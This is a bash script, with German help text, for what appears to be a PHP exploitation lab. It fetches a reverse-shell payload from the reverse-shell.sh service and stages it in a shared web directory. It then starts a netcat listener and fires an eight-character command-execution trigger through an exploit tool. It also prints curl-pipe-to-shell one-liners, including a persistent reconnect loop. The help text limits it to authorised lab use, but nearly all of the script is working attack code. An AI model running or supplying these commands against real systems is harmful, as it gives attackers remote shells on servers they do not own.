#!/usr/bin/env bash
# Integrate https://github.com/lukechilds/reverse-shell — payload into shared out/ (Zer061 / Apache).
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
KIT="$ROOT/third_party/zer061-php2shell"
OUT_DIR="$KIT/out"
PAYLOAD="$OUT_DIR/r"
ACTION="${1:-help}"
LHOST="${RS_LHOST:-}"
LPORT="${RS_LPORT:-4444}"
RS_URL="${REVERSE_SHELL_URL:-https://reverse-shell.sh}"

usage() {
  cat <<EOF
reverse-shell.sh Integration (lukechilds) — nur autorisierte Lab-Nutzung

  $0 fetch [HOST] [PORT]     curl Payload → $PAYLOAD (max 14B trigger: sh</out/r)
  $0 listen [PORT]           nc -lvnp PORT auf dem Host
  $0 zer061 [HOST] [PORT]    fetch + Hinweis + optional Zer061 mit -c 'sh</out/r'
  $0 oneliner HOST PORT      echo curl one-liner (Ziel mit Internet)

Hinweis: Lab-Netz ist internal — Target erreicht reverse-shell.sh nur wenn du
         Payload lokal nach out/r legst (fetch vom Host) und Apache /out teilt.

Referenz: https://github.com/lukechilds/reverse-shell
EOF
}

resolve_lhost() {
  if [[ -n "$LHOST" ]]; then
    echo "$LHOST"
    return
  fi
  if docker ps --format '{{.Names}}' | grep -qx vtbw-php2shell-apache; then
    local net
    net="$(docker inspect vtbw-php2shell-apache --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{"\n"}}{{end}}' | head -1)"
    docker network inspect "$net" --format '{{(index .IPAM.Config 0).Gateway}}' 2>/dev/null || true
  fi
}

cmd_fetch() {
  LHOST="${1:-$(resolve_lhost)}"
  LPORT="${2:-$LPORT}"
  if [[ -z "$LHOST" ]]; then
    echo "FEHLER: LHOST setzen: RS_LHOST=172.x.x.x $0 fetch" >&2
    exit 1
  fi
  mkdir -p "$OUT_DIR"
  chmod 1777 "$OUT_DIR" 2>/dev/null || true
  echo "[reverse-shell] GET ${RS_URL}/${LHOST}:${LPORT} → $PAYLOAD"
  if ! curl -fsSL "${RS_URL}/${LHOST}:${LPORT}" -o "$PAYLOAD"; then
    echo "FEHLER: curl fehlgeschlagen (Internet? oder RS_LHOST/PORT)" >&2
    exit 1
  fi
  chmod 755 "$PAYLOAD"
  echo "[reverse-shell] Payload OK. Zer061-Kurzbefehl (8 Zeichen): sh</out/r"
  echo "  ZER061_CMD='sh</out/r' vtbw-php2shell-lab zer061"
  echo "  oder: vtbw-php2shell-lab reverse-shell zer061"
}

cmd_listen() {
  local port="${1:-$LPORT}"
  if ! command -v nc >/dev/null; then
    echo "FEHLER: netcat (nc) auf dem Host installieren" >&2
    exit 1
  fi
  echo "[reverse-shell] Listener 0.0.0.0:$port (warte auf www-data vom Apache-Target)"
  exec nc -lvnp "$port"
}

cmd_zer061() {
  LHOST="${1:-$(resolve_lhost)}"
  LPORT="${2:-$LPORT}"
  cmd_fetch "$LHOST" "$LPORT"
  echo
  echo "[reverse-shell] Starte in zweitem Terminal: $0 listen $LPORT"
  read -r -p "Listener läuft? [j/N] " ok
  [[ "${ok,,}" == j* ]] || exit 0
  export ZER061_CMD='sh</out/r'
  export ZER061_RETRIES="${ZER061_RETRIES:-12}"
  exec "$ROOT/scripts/lab-zer061.sh"
}

cmd_oneliner() {
  local h="${1:?HOST}" p="${2:?PORT}"
  echo "curl -fsSL '${RS_URL}/${h}:${p}' | sh"
  echo "# reconnect: while true; do curl -fsSL '${RS_URL}/${h}:${p}' | sh; done"
}

mkdir -p "$OUT_DIR"
case "$ACTION" in
  help|-h) usage ;;
  fetch) cmd_fetch "${2:-}" "${3:-}" ;;
  listen) cmd_listen "${2:-}" ;;
  zer061) cmd_zer061 "${2:-}" "${3:-}" ;;
  oneliner) cmd_oneliner "${2:?}" "${3:?}" ;;
  *) usage; exit 2 ;;
esac
